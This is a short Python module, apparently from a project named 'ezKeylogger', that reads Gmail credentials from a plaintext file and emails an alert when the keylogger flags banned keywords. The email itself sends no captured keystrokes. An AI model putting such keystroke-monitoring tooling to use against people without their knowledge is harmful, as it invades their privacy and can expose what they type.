import smtplib, ssl
from email.message import EmailMessage

sender = ''
password = ''
receiver = ''

def get_info():
    global sender, password, receiver
    email_file = open("ezKeylogger/user_info.txt", 'r')
    sender = email_file.readline()
    password = email_file.readline()
    receiver = email_file.readline()

def notify_email():

    get_info()

    msg = EmailMessage()
    msg['Subject'] = 'Keyword Detected!'
    msg['From'] = sender
    msg['To'] = receiver
    msg.set_content('Keylogger has detected use of banned keywords, this action has been logged.')

    smtp_server = 'smtp.gmail.com'
    port = 465

    with smtplib.SMTP_SSL(smtp_server, port) as server:
        server.login(sender, password)
        server.send_message(msg)
        server.quit()